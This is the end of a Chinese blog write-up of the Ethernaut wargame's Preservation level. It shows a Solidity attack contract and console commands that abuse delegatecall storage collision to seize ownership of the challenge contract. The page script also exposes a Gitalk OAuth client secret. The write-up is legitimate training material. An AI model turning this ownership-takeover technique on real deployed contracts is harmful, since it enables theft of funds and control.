<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line"></span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    address player = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;</span><br><span class="line">    owner = player;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后设一次时间覆盖<code>timeZone1Library</code>的地址，由于<code>setFirstTime</code>在测试的时候被污染了，所以用<code>setSecondTime</code>，或者重开也行</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hack = <span class="string">&#x27;0xdbC43Ba45381e02825b14322cDdd15eC4B3164E6&#x27;</span>;</span><br><span class="line"><span class="keyword">await</span> contract.setSecondTime(hack);</span><br><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(contract.address, <span class="number">0</span>)</span><br><span class="line"><span class="comment">// &#x27;0x000000000000000000000000dbc43ba45381e02825b14322cddd15ec4b3164e6&#x27;</span></span><br></pre></td></tr></table></figure>
<p>然后调用<code>setFirstTime</code>获取权限</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.setFirstTime(<span class="number">123</span>);</span><br><span class="line"><span class="keyword">await</span> contract.owner()</span><br><span class="line"><span class="comment">// &#x27;0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266&#x27;</span></span><br></pre></td></tr></table></figure>
<p>提交即可</p>
<img src="/p/Ethernaut-note/image-20231201165646865.png" class="" title="img_image-20231201165646865">
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Tover. L</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://tover.xyz/p/Ethernaut-note/">https://tover.xyz/p/Ethernaut-note/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://tover.xyz" target="_blank">Tover's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/writeup/">writeup</a><a class="post-meta__tags" href="/tags/BlockChain/">BlockChain</a></div><div class="post_share"><div class="social-share" data-image="/img/icon.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://npm.elemecdn.com/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://npm.elemecdn.com/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/p/PermutationGroup-BRICS-sqrt/"><img class="prev-cover" src="/img/icon.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">置换群群元的开平方：以BRICS+的sqrt为例</div></div></a></div><div class="next-post pull-right"><a href="/p/2023-lmb-semi-Crypto/"><img class="next-cover" src="/img/icon.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2023蓝帽杯半决赛Crypto赛题WP</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/p/2021-ByteCTF-Overheard/" title="2021-ByteCTF的Overheard"><img class="cover" src="/img/icon.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-17</div><div class="title">2021-ByteCTF的Overheard</div></div></a></div><div><a href="/p/2021-ycb-wp/" title="2021羊城杯Crypto公钥部分WriteUp"><img class="cover" src="/img/icon.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-14</div><div class="title">2021羊城杯Crypto公钥部分WriteUp</div></div></a></div><div><a href="/p/2022-DASCTF-July-Crypto/" title="2022DASCTF七月赛 Crypto部分Writeup"><img class="cover" src="/img/icon.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-25</div><div class="title">2022DASCTF七月赛 Crypto部分Writeup</div></div></a></div><div><a href="/p/2022-HWSwinter-Elgamal/" title="2022HWS冬令营预选赛的Elgamal"><img class="cover" src="/img/icon.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-25</div><div class="title">2022HWS冬令营预选赛的Elgamal</div></div></a></div><div><a href="/p/2022-SUSCTF-Crypto/" title="2022 SUSCTF的两道半密码题WP"><img class="cover" src="/img/icon.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-01</div><div class="title">2022 SUSCTF的两道半密码题WP</div></div></a></div><div><a href="/p/2022-MRCTF-strange-classic/" title="2022 MRCTF的strange_classic"><img class="cover" src="/img/icon.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-26</div><div class="title">2022 MRCTF的strange_classic</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tover. L</div><div class="author-info__description">套娃. <br/> Know nothing about Crypto. <br/> Cryer in (old -> new)： <br/> <a target="_blank" rel="noopener" href='https://ctftime.org/team/23657'>Sloth</a> <br/> <a target="_blank" rel="noopener" href='https://ctftime.org/team/224936'>S1uM4i</a> <br/> <a target="_blank" rel="noopener" href='https://ctftime.org/team/194221'>1997</a> <br/></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">73</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a></div></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ToverPomelo" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:q664514882@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">/</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D%E7%AF%87"><span class="toc-number">1.</span> <span class="toc-text">介绍篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ethernaut%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">Ethernaut介绍</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E7%A7%81%E9%93%BE-Ethernaut%E5%B9%B3%E5%8F%B0"><span class="toc-number">2.</span> <span class="toc-text">搭建私链&#x2F;Ethernaut平台</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#00-Hello-Ethernaut"><span class="toc-number">3.</span> <span class="toc-text">00_Hello Ethernaut</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#01-Fallback"><span class="toc-number">4.</span> <span class="toc-text">01_Fallback</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#02-Fallout"><span class="toc-number">5.</span> <span class="toc-text">02_Fallout</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#03-Coin-Flip"><span class="toc-number">6.</span> <span class="toc-text">03_Coin Flip (*)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JavaScript%E6%96%B9%E6%B3%95"><span class="toc-number">6.1.</span> <span class="toc-text">JavaScript方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87MetaMask%E8%B0%83%E7%94%A8"><span class="toc-number">6.1.1.</span> <span class="toc-text">绕过MetaMask调用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E6%96%B9%E6%B3%95"><span class="toc-number">6.2.</span> <span class="toc-text">Python方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%91"><span class="toc-number">6.2.1.</span> <span class="toc-text">坑</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solidity%E6%96%B9%E6%B3%95"><span class="toc-number">6.3.</span> <span class="toc-text">Solidity方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#04-Telephone"><span class="toc-number">7.</span> <span class="toc-text">04_Telephone</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#05-Token"><span class="toc-number">8.</span> <span class="toc-text">05_Token</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#06-Delegation"><span class="toc-number">9.</span> <span class="toc-text">06_Delegation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#07-Force"><span class="toc-number">10.</span> <span class="toc-text">07_Force</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#08-Vault"><span class="toc-number">11.</span> <span class="toc-text">08_Vault</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#09-King"><span class="toc-number">12.</span> <span class="toc-text">09_King</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10-Re-entrancy"><span class="toc-number">13.</span> <span class="toc-text">10_Re-entrancy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11-Elevator"><span class="toc-number">14.</span> <span class="toc-text">11_Elevator</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#12-Privacy"><span class="toc-number">15.</span> <span class="toc-text">12_Privacy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#13-Gatekeeper-One"><span class="toc-number">16.</span> <span class="toc-text">13_Gatekeeper One</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GateOne"><span class="toc-number">16.1.</span> <span class="toc-text">GateOne</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GateTwo"><span class="toc-number">16.2.</span> <span class="toc-text">GateTwo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GateThree"><span class="toc-number">16.3.</span> <span class="toc-text">GateThree</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#14-Gatekeeper-Two"><span class="toc-number">17.</span> <span class="toc-text">14_Gatekeeper Two</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#15-Naught-Coin"><span class="toc-number">18.</span> <span class="toc-text">15_Naught Coin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#16-Preservation"><span class="toc-number">19.</span> <span class="toc-text">16_Preservation</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/p/2024-CryptoCTF/" title="2024 CryptoCTF Writeup（绝赞更新中...）"><img src="/img/icon.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024 CryptoCTF Writeup（绝赞更新中...）"/></a><div class="content"><a class="title" href="/p/2024-CryptoCTF/" title="2024 CryptoCTF Writeup（绝赞更新中...）">2024 CryptoCTF Writeup（绝赞更新中...）</a><time datetime="2024-06-20T14:59:48.000Z" title="发表于 2024-06-20 22:59:48">2024-06-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/p/Blue-Office/" title="C语言多线程爆破与2023CryptoCTF的Blue Office"><img src="/img/icon.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="C语言多线程爆破与2023CryptoCTF的Blue Office"/></a><div class="content"><a class="title" href="/p/Blue-Office/" title="C语言多线程爆破与2023CryptoCTF的Blue Office">C语言多线程爆破与2023CryptoCTF的Blue Office</a><time datetime="2024-06-11T06:09:46.000Z" title="发表于 2024-06-11 14:09:46">2024-06-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/p/2024-HSCTF-babyDP/" title="RSA中dp泄露的广义解法"><img src="/img/icon.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="RSA中dp泄露的广义解法"/></a><div class="content"><a class="title" href="/p/2024-HSCTF-babyDP/" title="RSA中dp泄露的广义解法">RSA中dp泄露的广义解法</a><time datetime="2024-04-16T02:59:59.000Z" title="发表于 2024-04-16 10:59:59">2024-04-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/p/2024-L3HCTF-guess/" title="2024 L3HCTF密码部分题解"><img src="/img/icon.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024 L3HCTF密码部分题解"/></a><div class="content"><a class="title" href="/p/2024-L3HCTF-guess/" title="2024 L3HCTF密码部分题解">2024 L3HCTF密码部分题解</a><time datetime="2024-02-05T07:54:30.000Z" title="发表于 2024-02-05 15:54:30">2024-02-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/p/Wiener-general/" title="Wiener没有说的攻击范围"><img src="/img/icon.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Wiener没有说的攻击范围"/></a><div class="content"><a class="title" href="/p/Wiener-general/" title="Wiener没有说的攻击范围">Wiener没有说的攻击范围</a><time datetime="2024-01-03T11:24:15.000Z" title="发表于 2024-01-03 19:24:15">2024-01-03</time></div></div></div></div></div></div></main><footer id="footer" style="background: linear-gradient(6.6deg, #0042bebb, #8e5690bb, #18466ebb, #000347bb)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2024 By Tover. L</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a target="_blank" rel="noopener" href="https://c10udlnk.top/">二进制是密码学人的自我修养 =v=</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><link rel="stylesheet" type="text/css" href="https://npm.elemecdn.com/katex@latest/dist/katex.min.css"><script src="https://npm.elemecdn.com/katex@latest/dist/contrib/copy-tex.min.js"></script><link rel="stylesheet" type="text/css" href="https://npm.elemecdn.com/katex@latest/dist/contrib/copy-tex.css"><script>(() => {
  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
    btf.wrap(item, 'div', { class: 'katex-wrap'})
  })
})()</script><script>function addGitalkSource () {
  const ele = document.createElement('link')
  ele.rel = 'stylesheet'
  ele.href= 'https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.4.0/gitalk.min.css'
  document.getElementsByTagName('head')[0].appendChild(ele)
}

function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk(Object.assign({
      clientID: '4989f2182ba1c60d6a7a',
      clientSecret: '80988778d911dff7e85489411dde0cce80d72e83',
      repo: 'ToverPomelo.github.io',
      owner: 'ToverPomelo',
      admin: ['ToverPomelo'],
      id: '13b4f06fc97dd0d335fd5f6883b7bb8c',
      language: 'zh-CN',
      perPage: 10,
      distractionFreeMode: false,
      pagerDirection: 'last',
      createIssueManually: true,
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    addGitalkSource()
    getScript('https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.4.0/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.innerHTML= n
  }
}

if ('Gitalk' === 'Gitalk' || !false) {
  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start -->
    <div class="myspine-spine-widget"></div>
    <script src="/js/myspine/spine-widget.js"></script>
    <script src="/js/myspine/spine-skeleton-binary.js"></script>
    <script src="/js/myspine/myspine.js"></script>
    <link type="text/css" href="/css/_third-party/myspine.css"></link>
    <script>
        new MySpine({
            spineDir: "/spine_models/",
            models: [{"name":"sd_21miku_normal_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"},{"name":"sd_21miku_band_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"},{"name":"sd_21miku_idol_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"},{"name":"sd_21miku_night_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"},{"name":"sd_21miku_street_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"},{"name":"sd_21miku_wonder_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"}],
            styles: {"widget":{"width":"200px","height":"200px"},"voiceText":{"color":"#e6e6e6"}},
            behaviors: {"start":{"animation":"w_emu_run01_f","voice":"","text":"Ohhhhh好耶"},"idle":{"maxMinutes":1,"animations":[{"name":"m_cool_idle01_f","loop":false},{"name":"m_cool_joy01_f","loop":false},{"name":"m_happy_idle01_f","loop":false},{"name":"m_happy_joy01_f","loop":false},{"name":"m_normal_idle01_f","loop":false},{"name":"m_normal_joy01_f","loop":false},{"name":"m_staff_idle01_f","loop":false},{"name":"n_general_wait_01_f","loop":false},{"name":"pose_default","loop":false},{"name":"u_vbsmen_battledore00_f","loop":false},{"name":"u_vbswomen_battledore00_f","loop":false},{"name":"w_adult_idle01_f","loop":false},{"name":"w_adult_joy01_f","loop":false},{"name":"w_cool_idle01_f","loop":false},{"name":"w_cool_joy01_f","loop":false},{"name":"w_cute_idle01_f","loop":false},{"name":"w_cute_joy01_f","loop":false},{"name":"w_happy_idle01_f","loop":false},{"name":"w_happy_joy01_f","loop":false},{"name":"w_normal_idle01_f","loop":false},{"name":"w_normal_joy01_f","loop":false},{"name":"w_pure_idle01_f","loop":false},{"name":"w_pure_joy01_f","loop":false},{"name":"w_staff_idle01_f","loop":false}],"voices":[{"voice":"","text":"不买立省百分百"}]},"interact":{"maxPlaySec":3,"animations":[{"name":"w_normal_joy01_b","loop":false},{"name":"m_cool_angry01_f","loop":false},{"name":"m_cool_doubt01_f","loop":false},{"name":"m_cool_laugh01_f","loop":false},{"name":"m_cool_listen01_f","loop":false},{"name":"m_cool_sad01_f","loop":false},{"name":"m_cool_surprise01_f","loop":false},{"name":"m_cool_talk01_f","loop":false},{"name":"m_happy_angry01_f","loop":false},{"name":"m_happy_doubt01_f","loop":false},{"name":"m_happy_laugh01_f","loop":false},{"name":"m_happy_listen01_f","loop":false},{"name":"m_happy_sad01_f","loop":false},{"name":"m_happy_surprise01_f","loop":false},{"name":"m_happy_talk01_f","loop":false},{"name":"m_normal_angry01_f","loop":false},{"name":"m_normal_doubt01_f","loop":false},{"name":"m_normal_laugh01_f","loop":false},{"name":"m_normal_listen01_f","loop":false},{"name":"m_normal_surprise01_f","loop":false},{"name":"m_normal_talk01_f","loop":false},{"name":"m_normal_walk01_b","loop":false},{"name":"m_normal_walk01_f","loop":false},{"name":"m_tsukasa_run01_f","loop":false},{"name":"n_general_walk_01_b","loop":false},{"name":"n_general_walk_01_f","loop":false},{"name":"u_liondancerobot_run_01_f","loop":false},{"name":"u_liondancerobot_run_02_f","loop":false},{"name":"u_vbsmen_battledore01_f","loop":false},{"name":"u_vbsmen_battledore02_f","loop":false},{"name":"u_vbsmen_battledore03_f","loop":false},{"name":"u_vbsmen_battledore04_f","loop":false},{"name":"u_vbswomen_battledore01_f","loop":false},{"name":"u_vbswomen_battledore02_f","loop":false},{"name":"u_vbswomen_battledore03_f","loop":false},{"name":"u_vbswomen_battledore04_f","loop":false},{"name":"w_adult_angry01_f","loop":false},{"name":"w_adult_doubt01_f","loop":false},{"name":"w_adult_laugh01_f","loop":false},{"name":"w_adult_listen01_f","loop":false},{"name":"w_adult_sad01_f","loop":false},{"name":"w_adult_surprise01_f","loop":false},{"name":"w_adult_talk01_f","loop":false},{"name":"w_cool_angry01_f","loop":false},{"name":"w_cool_doubt01_f","loop":false},{"name":"w_cool_laugh01_f","loop":false},{"name":"w_cool_listen01_f","loop":false},{"name":"w_cool_sad01_f","loop":false},{"name":"w_cool_surprise01_f","loop":false},{"name":"w_cool_talk01_f","loop":false},{"name":"w_cute_angry01_f","loop":false},{"name":"w_cute_angry02_f","loop":false},{"name":"w_cute_doubt01_f","loop":false},{"name":"w_cute_laugh01_f","loop":false},{"name":"w_cute_listen01_f","loop":false},{"name":"w_cute_sad01_f","loop":false},{"name":"w_cute_surprise01_f","loop":false},{"name":"w_cute_talk01_f","loop":false},{"name":"w_emu_run02_f","loop":false},{"name":"w_happy_angry01_f","loop":false},{"name":"w_happy_angry02_f","loop":false},{"name":"w_happy_doubt01_f","loop":false},{"name":"w_happy_doubt02_f","loop":false},{"name":"w_happy_laugh01_f","loop":false},{"name":"w_happy_listen01_f","loop":false},{"name":"w_happy_sad01_f","loop":false},{"name":"w_happy_surprise01_f","loop":false},{"name":"w_happy_talk01_f","loop":false},{"name":"w_normal_laugh01_f","loop":false},{"name":"w_normal_listen01_f","loop":false},{"name":"w_normal_talk01_f","loop":false},{"name":"w_normal_walk01_b","loop":false},{"name":"w_normal_walk01_f","loop":false},{"name":"w_pure_angry01_f","loop":false},{"name":"w_pure_doubt01_f","loop":false},{"name":"w_pure_laugh01_f","loop":false},{"name":"w_pure_listen01_f","loop":false},{"name":"w_pure_sad01_f","loop":false},{"name":"w_pure_surprise01_f","loop":false},{"name":"w_pure_talk01_f","loop":false},{"name":"z_mesh_templete","loop":false},{"name":"z_test_F_negi01","loop":false}],"voices":[{"voice":"","text":"哈茨捏米库 迭矢"}]}}
        });
    </script>
    <!-- hexo injector body_end end --></body></html>